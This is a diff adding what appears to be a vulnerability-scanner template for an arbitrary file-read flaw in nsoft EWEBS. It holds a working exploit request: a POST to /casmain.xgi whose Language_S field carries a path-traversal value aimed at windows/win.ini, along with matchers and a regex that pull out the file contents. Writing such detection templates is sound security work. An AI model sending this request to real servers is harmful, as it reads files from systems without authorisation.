@@ -1,0 +1,36 @@
+id: nsoft-ewebs-casmain-file-read
+
+info:
+  name: nsoft EWEBS casmain.xgi File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    nsoft EWEBS casmain.xgi File read vulnerability allows an attacker to read arbitrary files on the server.
+  reference:
+    - http://wiki.peiqi.tech
+
+variables:
+  filepath: '../../../../../../../windows/win.ini'
+
+http:
+  - raw:
+      - |
+        POST /casmain.xgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Language_S={{filepath}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "for 16-bit app support"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "([\\s\\S]+)<script>history"
